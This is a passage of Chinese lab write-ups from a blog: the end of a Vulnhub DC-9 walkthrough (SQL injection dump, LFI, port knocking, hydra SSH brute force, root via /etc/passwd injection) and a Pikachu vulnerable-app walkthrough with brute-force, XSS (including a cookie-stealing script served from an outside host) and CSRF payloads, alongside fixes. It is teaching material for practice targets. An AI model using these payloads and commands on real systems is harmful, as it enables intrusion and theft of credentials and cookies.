\"search=1\" -D Staff -T Users --dump\n\n#dump完密码的时候会提示你是否解密md5,你选择SQLmap自带的字典就可以跑出明文密码\n```\n\n![](https://i.loli.net/2020/05/24/AgQZfhdyX7qrKjk.png)\n\n得到用户名和密码：**admin/transorbital1**然后使用这个用户去站点登录\n\n![](https://i.loli.net/2020/05/24/VPpf2usMIc9jd6F.png)\n\n### 2.本地文件包含LFI\n\n登录后多了`Add Record和Manage`页面，在`Manage`的下面发现了一句话`File does not exits` ，猜测可能存在文件包含漏洞,猜测文件参数是**file**\n\n```\n?file=../../../../etc/passwd\n```\n\n![](https://i.loli.net/2020/05/24/tqfT64rpaSu1YI8.png)\n\n果然存在LFI漏洞,接下来是`fuzz`一下系统文件\n\n![](../images/Vulnhub%E9%9D%B6%E6%9C%BA%EF%BC%9ADC-9/image-20200524131121933.png)\n\n发现了`/etc/knockd.conf`，这就和之前`nmap`扫描靶机运行了SSH服务，但是状态是`filtered`对应起来了，因为`knockd`可以对SSH进行防护\n\n### 3.端口敲门\n\n> `knockd`字面意思是敲，只是这里敲的是`端口`，而且需要按照顺序‘敲’端口。如果敲击规则匹配，则可以让防火墙实时更改策略。从而达到开关防火墙的目的。\n\n更多详细请看：\n\n- [Port-knocking 简单教程](https://www.cnblogs.com/xiaoxiaoleo/p/8523322.html)\n\n- [端口敲门服务](https://zhuanlan.zhihu.com/p/59488488)\n\n- [保护 SSH 的三把锁](https://www.ibm.com/developerworks/cn/aix/library/au-sshlocks/index.html)\n\n看一下`/etc/knockd.conf`文件中的自定义端口\n\n![](https://i.loli.net/2020/05/24/64fRKVQMw1lELkX.png)\n\n有3个自定义端口`7469，8475，9842`,根据`Port-knocking`的规则依次访问这三个端口就可以打开SSH服务了\n\n```bash\nsudo nmap -p 7469 192.168.0.105\nsudo nmap -p 8475 192.168.0.105\nsudo nmap -p 9842 192.168.0.105\n\n或者安装knockd\nknock 192.168.0.105 7469 8475 9842\n```\n\n![](https://i.loli.net/2020/05/24/JWvxTckDZNijXfO.png)\n\n现在我们看一哈ssh服务被敲开没有\n\n```\nsudo nmap -p 22 192.168.0.105\n```\n\n![](https://i.loli.net/2020/05/24/jU1YD8TIMEHVX2m.png)\n\n不出所料SSH服务被成功敲开\n\n### 4.hydra爆破SSH账户\n\n将前面所爆出来的那些员工的账号和密码编写成两个字典，进行ssh爆破\n\n| username.txt                                           | password.txt                                           |\n| ------------------------------------------------------ | ------------------------------------------------------ |\n| ![](https://i.loli.net/2020/05/24/Pekn7KWZwCj68lB.png) | ![](https://i.loli.net/2020/05/24/532jwQDIftZloWb.png) |\n\n```bash\nhydra -L username.txt -P password.txt ssh://192.168.0.105 \n```\n\n![](https://i.loli.net/2020/05/24/jZfit8YRFUrehVl.png)\n\n爆破出来有3个用户可用，`chandlerb\\UrAG0D!`、`joeyt\\Passw0rd`、`janitor\\Ilovepeepee`\n\n依次登录3个用户，最终在用户`janitor`的目录下找到了隐藏文件\n\n```bash\nssh chandlerb@192.168.0.105 \nUrAG0D!\n\nssh joeyt@192.168.0.105 \nPassw0rd\n\nssh janitor@192.168.0.105 \nIlovepeepee\n```\n\n![](https://i.loli.net/2020/05/24/AHniNy6gY4cLIE3.png)\n\n`.secrets-for-putin`隐藏文件中有一个可读文件，打开后这好像是存放的用户密码，然后把这些密码再加进刚刚我们编写的`password.txt`字典中重新再爆破一次看看\n\n![](https://i.loli.net/2020/05/24/VY2IExTHm7dcl51.png)\n\n爆破出了一个新的用户号：`fredf\\B4-Tru3-001`\n\n## 三、提升权限\n\n使用`fredf`用户登录靶机\n\n```bash\nssh fredf@192.168.0.105\nB4-Tru3-001\n```\n\n列出sudo权限的命令，这里发现fred用户在`NOPASSWD`的情况下可以使用root权限运行这个test文件\n\n```bash\nsudo -l\n```\n\n![](https://i.loli.net/2020/05/24/QTN2BKmgElhRJa1.png)\n\n尝试运行，发现它是一个python文件\n\n![](https://i.loli.net/2020/05/24/1rZh73gSJDRWf4X.png)\n\n使用find查找test.py文件\n\n```bash\nfind / -name test.py 2>/dev/null\n\n2>/dev/null 代表忽略掉错误提示信息。\n```\n\n![](https://i.loli.net/2020/05/24/RHetfyhYCZM8FVo.png)\n\n查看test.py\n\n![image-20200524145858769](https://i.loli.net/2020/05/24/jyYTd4DziHJGgaW.png)\n\npy文件的含义为：`读取参数1的内容，然后将参数1的内容写入到参数2的内容中。`\n\n那我们可以构造一个root权限用户，将该用户信息写入文件内，将改文件作为参数1，`/etc/passwd`作为参数2，这样就创建了一个root权限用户，就能实现提权了\n\n**构造参数1**\n\n```bash\nopenssl passwd -1 -salt admin 123456\n\n-1 的意思是使用md5加密算法\n-salt 自动插入一个随机数作为文件内容加密\nadmin 123456 用户名和密码\n```\n\n![](https://i.loli.net/2020/05/24/T8Uc6xaQY1lnNIk.png)\n\n根据`/etc/passwd`的格式，修改一下，然后存入一个文件里，这个文件就是`参数1`\n\n```bash\necho 'admin:$1$admin$LClYcRe.ee8dQwgrFc5nz.:0:0::/root:/bin/bash' >> /tmp/passwd\n    # 用户名:密码:uid:gid:家目录:登陆后使用的shell\n    \nsudo ./test /tmp/passwd /etc/passwd    \n```\n\n![](https://i.loli.net/2020/05/24/XveFQ2ZUgJj61lk.png)\n\n```bash\nsu admin\ncd /root\nls\ncat theflag.txt\n```\n\n![](https://i.loli.net/2020/05/24/QL2PaDpKjFMXrcH.png)\n\n![](https://i.loli.net/2020/05/24/L9NzyOlfR5ZpUHq.png)\n\n## 赞助💰\n\n如果你觉得对你有帮助，你可以赞助我一杯冰可乐吧！嘻嘻🤭\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>","tags":["靶场","渗透测试"],"categories":["Web"]},{"title":"Pikachu漏洞平台通关记录","url":"/posts/30313.html","content":"开始复习最基础的Web漏洞，查漏补缺，打好基础，我也尽量把文章写得详细一些，希望对刚入门的小白能有一些帮助。\n\n## Pikachu\n\n**简介**\n\n> Pikachu是一个带有漏洞的Web应用系统，在这里包含了常见的web安全漏洞。 如果你是一个Web渗透测试学习人员且正发愁没有合适的靶场进行练习，那么Pikachu可能正合你意。\n\n**安装**\n\n项目地址：https://github.com/zhuifengshaonianhanlu/pikachu\n\n1.将下好的项目放置phpStudy的`WWW`目录下\n\n2.然后修改配置文件`/pikachu-master/inc/config.inc.php`，修改成自己的mysql用户名和密码\n\n3.浏览器访问 http://127.0.0.1/pikachu-master/ 进入主页面\n\n4.点击首页红色字体进行初始化安装\n\n**乱码解决**\n\n如果靶场出现了乱码，我们可以执行以下步骤\n\n1.按\"win + R\" ，并输入 regedit 进入注册表\n\n2.找到 `HKEY_CURRENT_USER\\Console\\%SystemRoot%_system32_cmd.exe`，如果该项下已存在 `CodePage` 项，则把值改为十进制 \"`65001`\"，点击确定即可；如果不存在，在该项下新建一个 DWORD（32位值），命名为 \"CodePage\"，值设为 \"65001\"。然后关闭注册表管理器。\n\n## Burte Force\n\n### 基础知识准备\n\n> 暴力破解(Burte Force)是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。\n\n**Burp各种攻击模式的区别**\n\n1. **Sinper：**一个变量设置一个payload进行攻击\n2. **Battering ram：**可以设置两个变量，把payload同时给两个变量\n3. **Pitchfork：**两个变量分别设置payload，然后按顺序一一对应进行破解\n4. **Cluster bomb：**两个变量分别设置payload，然后交叉列所有情况进行破解（常用） \n\n### 基于表单的暴力破解\n\n这个还是比较简单的，抓包发送到intruder模块，配置参数开始攻击就可以了，我就懒得写了，大家可以参考这篇文章\n\n参考：[Pikachu暴力破解——基于表单](https://www.cnblogs.com/ApricityJ/p/12628753.html)\n\n### 验证码绕过(on server)\n\n> 验证码可以用来防止恶意注册、防止暴力破解。\n\n**服务端验证码常见问题：**\n\n- 1.验证码设计的太过简单和有规律，容易被猜解\n- 2.验证码校验不严格，逻辑出现问题\n- 3.验证码在后台不过期，导致长期可以使用\n\n检查验证码元素，发现验证机制来自后端\n\n![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/EuZBhv5RHaNXzJw.png)\n\n那么我们根据这3个常见问题我们来一一验证是否Pikachu靶场满足上面三条中的情况，那我们打开靶场页面吧！\n\n一、观察验证码，验证码是没有规律的，并且也不简单，所以第一条不满足\n\n二、当验证码输入正确、错误和输入为空会是以下3种情况：\n\n| 验证码正确                                                   | 验证码错误                                                   | 验证码为空                                                   |\n| ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/vjVWKpezmsNaUG4.png) | ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/6pZYRdMaGClBQ9E.png) | ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/zQo9KaXrB6tW7fG.png) |\n\n可以看到服务端对验证码的有效性做过校验,一切逻辑正常，所以第二条也不满足\n\n三、我们随便输入用户名和密码，输入正确验证码进行抓包，发送到repeater模块\n\n| 用户名密码不同，验证码相同                                   | 用户名密码不同，验证码相同                                   |\n| ------------------------------------------------------------ | ------------------------------------------------------------ |\n| ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/Sb3FWYldJEZjmqO.png) | ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/6nFUis8RyW5LwJE.png) |\n\n按理说输入不同的用户，应该报验证错误的提示，但是这里却没有，说明在输入第二个用户时验证码还没有过期，那么第三种情况就满足了\n\n**漏洞分析:**\n\n- 当刷新页面,客户端向服务器发出请求,生出新的验证码；\n\n- 同时后台会在`session`中将这个验证码存下来【目的是为了对用户输入的验证码进行验证)】；\n\n- 所以当输入错误或空的验证码都会提示错误信息,只有正确的验证码才可以被服务器接受；\n\n- 但是如果这个验证码在后台不过期或者过期时间较长,足够我们去爆破用户名密码,那么漏洞就产生了。\n\n其漏洞根本在于服务器端未设定生出验证码的session的过期时间,那么按照PHP语言默认session的过期时间为24分钟,这个验证码24分钟内都是有效的,那么也足够黑客进行暴力破解啦\n\n那我们就来利用一下这个漏洞吧，将刚才的包发送到intruder模块\n\n1.设置爆破位置及攻击方式\n\n![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/amki1dFVAYKntTS.png)\n\n2.设置payloads，这里为了快速爆破出，我添加了包含正确用户名密码的5个用户，毕竟掌握方法才是最重要的啦\n\n| payload1                                                     | payload2                                                     |\n| ------------------------------------------------------------ | ------------------------------------------------------------ |\n| ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/2PGq6DNpni9tbS8.png) | ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/ZPifDKv4Th65r71.png) |\n\n3.点击开始攻击，根据响应长度就可以判断出正确的用户名和密码了\n\n![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/PBQmaFJE7g9Dvzn.png)\n\n**修复方法:**\n\n方法一：在php.ini配置文件中设置过期时间\n方法二：在代码中设定该验证码验证过一次之后,就将其session进行销毁(更有效)\n\n### 验证码绕过(on client)\n\n**客户端验证码常见问题:**\n\n- 1.使用前端js实现验证码(纸老虎)\n- 2.将验证码在cookie中泄露,容易被获取\n- 3.将验证码在前端源代码中泄露,容易被获取\n\n检查验证码元素，发现验证机制来自前端JS\n\n![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/B1sD6CkFEt4qPab.png)\n\n既然验证来自前端JS,那我们我们可以在burp suite不输入验证码或者输入错的验证码完成爆破\n\n| 输错的验证码                                                 | 不输验证码                                                   |\n| ------------------------------------------------------------ | ------------------------------------------------------------ |\n| ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/fIwRYyGhTumvqox.png) | ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/GjPi9OX3pEf265k.png) |\n\n可以发现不输入验证码或者输入错的验证码对返回结果并没有影响，说明确实验证来自前端\n\n那我们就来利用一下这个漏洞吧，将包发送到intruder模块,后面步骤跟on server的操作是一样的\n\n1.设置爆破位置及攻击方式\n\n![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/OClQvRkHgIXmNK7.png)\n\n2.设置payloads，这里为了快速爆破出，我添加了包含正确用户名密码的5个用户，毕竟掌握方法才是最重要的啦\n\n\n| payload1                                                     | payload2                                                     |\n| ------------------------------------------------------------ | ------------------------------------------------------------ |\n| ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/2PGq6DNpni9tbS8.png) | ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/ZPifDKv4Th65r71.png) |\n\n3.点击开始攻击，根据响应长度就可以判断出正确的用户名和密码了\n\n![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/PBQmaFJE7g9Dvzn.png)\n\n### token防爆破?\n\n> token是由服务端生成的一串字符串，作为客户端向服务端请求的一个标识。如果前端使用用户名/密码向服务端请求认证，服务端认证成功，那么在服务端会返回 token 给前端。前端可以在每次请求的时候带上 token 证明自己的合法地位。\n\n**token特性**\n\n- token 完全由应用管理，所以它可以避开同源策略\n\n- token防止重复提交和CSRF\n\n- token 可以是无状态的，可以在多个服务间共享\n- token无法防止暴力破解\n\n检查元素，发现页面不仅提交username和password，还提交了一个hidden属性的token值\n\n![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/MWVjwsz1ALdQCDu.png)\n\n既然token是无法防止爆破的，那么我们就来爆破试试吧，抓包发送到intruder模块，因为最多只能爆破2个参数，所以要知道用户名才行。\n\n1.设置爆破位置及攻击方式\n\n![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/nPjMAL1toQ5Rubi.png)\n\n2.设置token正则表达式。\n\n在`Options`中的`Grep-Extract`中打勾，点击`add`添加过滤条件 点击`refetch response`找到响应包中的token 之选中，再点击`OK`\n\n![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/2seXrV4KSmHpZPG.png)\n\n在`Options`中将线程设置为`1`，对于每一个包返回来的token值都是不一样的，所以我们只能选择单线程进行攻击\n\n将最下方的`Redirections`选择为`Always`，如果不点上这个就不会打开html包的body部分，因为token值是存储在body的hidden部分，那么也就不会自动获取token值，我们也就不能绕过它进行暴力破解了\n\n| 线程设置                                                     | 重定向设置                                                   |\n| ------------------------------------------------------------ | ------------------------------------------------------------ |\n| ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/er9q8gfSTU7Qix1.png) | ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/T7c9YugmfLiStU3.png) |\n\n3.设置payloads。这里为了快速爆破出，密码payload我设置了包含正确密码的5个条目\n\n| payload1                                                     | payload2                                                     |\n| ------------------------------------------------------------ | ------------------------------------------------------------ |\n| ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/v2uym4JE7XtFCzL.png) | ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/9JSiA4MEtCx1TdB.png) |\n\n4.点击开始攻击，根据响应长度就可以判断出正确密码了\n\n![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/wecp5GFiQRSa9BM.png)\n\n## XSS\n\n> Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写\"CSS\"冲突，故又称XSS。形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。\n\n### 反射型xss(get)\n\n**Payload:**\n\n```javascript\n<script>alert(\"jwt\")</script>\n```\n\n由于前端对输入长度做了限制，我们需要修改一下最大长度才能输入完整的payload，这是一个简单的反射型XSS，从前端输入由后端接受再输出\n\n**源码分析:**\n\n```php\n//关键代码\n$html.=\"<p class='notice'>who is {$_GET['message']},i don't care!</p>\";\n\n<?php echo $html;?>\n```\n\n`$html`变量直接拼接了`{$_GET[‘message’]}`,又直接`echo`，没做任何过滤，转义。\n\n**利用Pikachu-XSS后台获取cookie**\n\n1.访问管理工具里的XSS后台，初始化数据库\n\n2.登录XSS后台，账户admin/123456\n\n3.在反射型xss窗口中插入如下js后，在XSS后台就能成功接收到Cookie\n\n```js\n<script src=http://xss.fbisb.com/ij7V></script>\n```\n\n由于是GET类型的XSS漏洞，我们可以直接构造一个带有Payload的URL，诱使受害者点击就能取得Cookie\n\n### 反射型xss(post)\n\n可以看到是一个用户登陆窗口，根据提示，账户admin/123456\n\n登上去以后发现还是没有任何过滤，直接构造**Payload:**\n\n```javascript\n<script>alert(document.cookie)</script>;\n```\n\n### 存储型xss\n\n> 存储型XSS和反射型XSS形成的原因是一样的，不同的是存储型XSS下攻击者的可以将脚本注入到后台存储起来，构成更加持久的危害\n\n**Payload:**\n\n```javascript\n<script>alert(document.cookie)</script>\n```\n\n没有任何过滤，插入payload后，每次刷新页面都会alert出cookie，说明是存储型的，已经存在数据库了。\n\n**源码分析:**\n\n```php\n//关键代码\n$message=escape($link, $_POST['message']);\n$query=\"insert into message(content,time) values('$message',now())\";\n\necho \"<p class='con'>{$data['content']}</p><a href='xss_stored.php?id={$data['id']}'>删除</a>\";\n```\n\n对输入的内容没有做任何过滤和转义，直接往数据库里插入了用户输入的内容，输出的时候也没有任何过滤和转义，直接取数据echo出来。\n\n### DOM型xss\n\n> 造成DOM型XSS的原因是前端的输入被DOM给获取到了，通过DOM又在前端输出，跟反射型和存储型比起来，它是不经过后台交互的\n\n**HTML DOM 树**\n\n![](https://www.w3school.com.cn/i/ct_htmltree.gif)\n\n随便输入字符串后点击按钮，可以看到页面显示一条超链接，审查源码\n\n```html\n<script>\nfunction domxss(){\n    var str = document.getElementById(\"text\").value;\n    document.getElementById(\"dom\").innerHTML = \"<a href='\"+str+\"'>what do you see?</a>\";\n}\n</script>\n\n<div id=\"dom\">\n  <a href=\"jwt\">what do you see?</a>\n</div>\n```\n\n发现我们输入的str被调整在id为dom的元素里，还有段JS代码，它通过 getElementById 获取到了标签 id 为 text 的内容赋值给str，然后又把 str 的内容通过字符串拼接的方式写到了 a 标签的 href 属性中，a标签会写到 id 为 dom的 div 标签中。\n\n**通过闭合a标签的方式构造Payload：**\n\n```html\n//payload1:\n#' onclick=alert(\"jwt\")>\n\n闭合后：<a href='#' onclick=\"alert(\"jwt\")\">'>what do you see?</a>\n\n//payload2:\n'><img src=\"#\" onmouseover=\"alert('jwt')\">\n\n闭合后：<a href><img src=\"#\" onmouseover=\"alert('jwt')\">'>what do you see?</a>\n\n    \n//payload3:    \n' onclick=\"alert('jwt')\">\n\n闭合后：<a href onclick=\"alert('jwt')\"> >'what do you see?</a>    \n```\n\n### DOM型xss-x\n\n同样随便输入字符串后点击按钮，可以看到页面显示一条超链接，审查源码\n\n```html\n<script>\nfunction domxss(){\n    var str = window.location.search;\n    var txss = decodeURIComponent(str.split(\"text=\")[1]);\n    var xss = txss.replace(/\\+/g,' ');\n    document.getElementById(\"dom\").innerHTML = \"<a href='\"+xss+\"'>就让往事都随风,都随风吧</a>\";\n}\n</script>\n\n<div id=\"dom\">\n    <a href=\"jwt\">就让往事都随风,都随风吧</a>\n</div>\n```\n\n这里也有段JS代码，它利用 `window.location.search` 获取浏览器中URL的内容，然后赋值给 str ，再经过URL解码和字符串分隔，取出URL中的参数内容，再把 “+” 替换为 “ ”（空格），赋值给 xss，最后把 xss 拼接到 a 标签中，然后写到 id 为 dom 的 div 标签中，跟前面的DOM不同的是，它的输入是从浏览器的URL中获取的，很像反射型XSS(get)\n\n用户的输入同样被拼接到a标签中，构造的`Payload`跟上面是一样的\n\n```html\n//payload1:\n#' onclick=alert(\"jwt\")>\n\n//payload2:\n'><img src=\"#\" onmouseover=\"alert('jwt')\">\n    \n//payload3:    \n' onclick=\"alert('jwt')\">\n```\n\n### xss之盲打\n\n> 输入的内容**不会在前端输出**，而是提交到了后台，管理员才可以看到，如果我们输入一段恶意JS代码，管理员登录到后台管理界面，恶意JS代码就会被执行，后台管理员就会遭受到XSS攻击\n\n在页面输入以下内容\n\n![](https://img.jwt1399.top//img/20200728184942.png)\n\n查看提示，得到后台地址(/xssblind/admin_login.php)和账户(admin/123456)，登录后台管理界面,成功弹窗\n\n![](https://img.jwt1399.top//img/20200728185253.png)\n\n**DNSlog盲打Payload：**\n\n```html\n<img src=\"http://xss.xxxxx.ceye.io/abc>                  \n```\n\n如果盲打成功，会在平台上收到如下的链接访问记录：\n\n![](https://img.jwt1399.top//img/20200807145213.png)\n\n### xss之过滤\n\n**常见过滤绕过方法：**\n\n- 前端限制绕过，直接抓包重放，或者修改html前端代码。比如反射型XSS(get)中限制输入20个字符。\n- 大小写，例如`<SCRIPT>aLeRT(“jwt”)</sCRIpt>`。后台可能用正则表达式匹配，如果正则里面只匹配小写，那就可能被绕过。\n- 双写，例如`<scri<script>pt>alert(“jwt”)</scri</script>pt>`。后台可能把`<script>`标签去掉，但可能只去掉一次。\n- 注释干扰，例如`<scri<!--test-->pt>alert(“jwt”)</sc<!--test-->ript>`。加上注释后可能可以绕过后台过滤机制。\n- 编码，后台过滤了特殊字符，比如`<script>`标签，但该标签可以被各种编码，后台不一定过滤\n\n\n\n在页面上输入，进行测试，看看过滤了什么\n\n| 输入`<script>alert(\"jwt\")</script>`                  | 输入`alert(\"jwt\")`                                   |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top//img/20200728191609.png) | ![](https://img.jwt1399.top//img/20200728192142.png) |\n\n可以推测出过滤了`<srcipt`及其之间的字符，尝试大小写混合或使用img标签，成功绕过\n\n```javascript\n<SCRIPT>alert(\"jwt\")</sCRIpt>\n\n<img src=x onerror=alert(\"jwt\")>\n```\n\n**源码分析：**\n\n```php\n$html = '';\nif(isset($_GET['submit']) && $_GET['message'] != null){\n    //这里会使用正则对<script进行替换为空,也就是过滤掉\n    $message=preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/', '', $_GET['message']);\n//    $message=str_ireplace('<script>',$_GET['message']);\n\n    if($message == 'yes'){\n        $html.=\"<p>那就去人民广场一个人坐一会儿吧!</p>\";\n    }else{\n        $html.=\"<p>别说这些'{$message}'的话,不要怕,就是干!</p>\";\n    }\n}\n```\n\n后台对用户输入的内容进行了正则匹配过滤，将`<srcipt`和其之间的字符都过滤掉了。但是没有过滤img标签，没有过滤危险函数。\n\n### xss之htmlspecialchars\n\n> htmlspecialchars()是PHP里面**把预定义的字符转换为HTML实体的函数**，这个函数默认情况下是不会编码单引号的\n\n**语法：**\n\n```php\n$value = htmlspecialchars($_GET['value'], ENT_COMPAT); \n# 第2个参数规定了如何处理引号\nENT_COMPAT   # 默认,仅对双引号进行编码\nENT_QUOTES   # 推荐,编码单双引号\nENT_NOQUOTES # 不编码任何引号\n```\n\n预定义的字符是：\n\n- & （和号）成为  &amp\n- \" （双引号）成为  &quot\n- ' （单引号）成为 &#039\n- < （小于）成为  &lt\n- \\> （大于）成为  &lt\n\n审查元素后发现输入的内容是被拼接在`<a href =\"输入的内容\">`中\n\n输入`'\"<>?#'1399`,可以看到 `\"`、`>` 、 `<` 都经过了编码，单引号依然可以使用\n\n![](https://img.jwt1399.top//img/20200728194027.png)\n\n**构造Payload:**先使用单引号闭合a标签，然后再进行弹框。提交后需要点击超链接才会弹框\n\n```html\npayload1:\n#' onclick=alert('jwt') '\n闭合后：<a href=\"#\" onclick=\"alert('jwt')\" ''>#' onclick=alert('jwt') '</a>\n\npayload2:\n#' onclick='alert(1399)\n\n闭合后：<a href=\"#\" onclick=\"alert(1399)\">#' onclick='alert(1399)</a>\n```\n\n### xss之href输出\n\n**源码分析：**\n\n```php+HTML\n$message=htmlspecialchars($_GET['message'],ENT_QUOTES);\n$html.=\"<a href='{$message}'> 阁下自己输入的url还请自己点一下吧</a>\";\n```\n\n使用了都`htmlspecialchars`函数，`><\"'&`都被HTML实体化，且用户输入的在`href`标签里，可以使用javascript协议来执行js代码\n\n 构造Payload如下，没有上面被转义的字符\n\n```javascript\njavascript:alert('jwt')\n```\n\n**防御href :**\n\n- 输入的时候只允许 http 或 https 开头的协议，才允许输出\n- 其次再进行htmlspecialchars处理\n\n### xss之js输出\n\n> 漏洞的输出点是在JS中，通过用户的输入动态生成JS代码\n\n随便输入一些字符，检查页面代码\n\n```javascript\n<script>\n    $ms='输入的字符';\n    if($ms.length != 0){\n        if($ms == 'tmac'){\n            $('#fromjs').text('tmac确实厉害,看那小眼神..')\n        }else {\n//            alert($ms);\n            $('#fromjs').text('无论如何不要放弃心中所爱..')\n        }\n    }\n</script>\n```\n\n这段JS代码会把我们的输入放到JS中，然后对这个变量进行判断，然后再输出\n\n **构造Payload：**\n\n用一个单引号和`</script>`闭合掉页面中的`<script>`，然后再插入自己的JS代码\n\n```javascript\n'</script><script>alert('jwt')</script>\n```\n\n![](https://img.jwt1399.top//img/20200728201421.png)\n\n其他Payload\n\n```javascript\n'; alert(1); //\n'</script><script>alert(1)//\n```\n\n**修复需要注意的问题：**\n\n1.这里如果进行html的实体编码,虽然可以解决XSS的问题,但是实体编码后的内容,在JS里面不会进行翻译,这样会导致前端的功能无法使用。\n\n2.所以在JS的输出点应该使用\\对特殊字符进行转义\n\n### XSS防范\n\n **输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;**\n **输出转义：根据输出点的位置对输出到前端的内容进行适当转义;**\n\n**参考：**\n\nhttps://www.cnblogs.com/dogecheng/p/11556221.html\n\nhttps://blog.csdn.net/weixin_41652128/article/details/95669624\n\n[XSS常见Payload](https://www.cnblogs.com/xuehen/p/4814237.html)\n\n## **CSRF**\n\n> 跨站请求伪造-Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为\"one click\"攻击。 \n\n简单理解：攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。\n\n**CSRF与XSS的区别：**\n\nCSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。\n\n### CSRF(get)\n\n根据提示，账号有vince/allen/kobe/grady/kevin/lucy/lili，密码全部是123456\n\n我们登录 kobe 用户，登录后来到个人中心，可以在这修改个人信息\n\n那么更改kobe信息，并抓包\n\n![](https://img.jwt1399.top//img/20200807180231.png)\n\n从请求包可以看出，后台没做 CSRF token，且是通过 GET 请求来提交修改信息的\n\n**Payload：**\n\n将性别、手机、住址、邮箱都重新定义数据\n\n```\nhttp://127.0.0.1/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=2&phonenum=123456&add=Chengdu&email=jwt@163.com&submit=submit\n```\n\n将该URL发送给用户，若用户在`登录状态`下点击这个URL，则该用户的信息就会被更改为我们定义的信息\n\n**实例演示：**\n\n例如，我们让用户 allen 点击一下上面这个 Payload 